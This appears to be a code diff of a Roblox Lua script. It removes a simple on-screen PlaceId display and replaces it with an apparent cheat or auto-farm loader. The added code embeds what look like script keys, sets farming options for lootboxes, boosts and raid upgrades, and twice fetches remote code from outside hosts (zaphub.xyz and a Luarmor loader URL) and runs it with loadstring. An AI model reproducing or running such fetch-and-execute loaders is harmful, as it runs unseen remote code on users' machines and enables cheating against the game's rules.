@@ -1,26 +1,21 @@
-local Players = game:GetService("Players")
-
-local player = Players.LocalPlayer
-
--- Tạo UI để hiển thị PlaceId
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
-local placeIdLabel = Instance.new("TextLabel")
-placeIdLabel.Size = UDim2.new(0, 300, 0, 50)
-placeIdLabel.Position = UDim2.new(1, -310, 0, 10) -- Góc phải trên màn hình
-placeIdLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-placeIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-placeIdLabel.TextSize = 20
-placeIdLabel.Parent = screenGui
-
--- Hàm cập nhật PlaceId liên tục
-local function updatePlaceID()
-    while true do
-        placeIdLabel.Text = "Place ID: " .. game.PlaceId
-        task.wait(3) -- Cập nhật mỗi 5 giây
-    end
+task.spawn(function()
+    task.wait(10)
+    script_key="JjmhlAdFeuXFWubLiuoxRyorUCfAzHwb";
+    loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
 end
 
--- Chạy vòng lặp cập nhật PlaceId
-task.spawn(updatePlaceID)
+script_key = "NpgYjqSGlVoUCHAtOaTgfhSSVNQSDMRj";
+-- INSERT YOUR CONFIG HERE --
+_G.GPROGRESS_MODE = "nill"
+_G.GZONE_TO = 999
+_G.GGFX_MODE = 2
+
+_G.GLOOTBOXES = {"Locked Hype Egg","Lucky Gift"}
+_G.GUSE_BOOSTS = true
+_G.GEVENT_UPGRADES = {
+   "LuckyRaidDamage",
+   "LuckyRaidXP",
+} 
+
+-- INSERT YOUR CONFIG HERE --
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
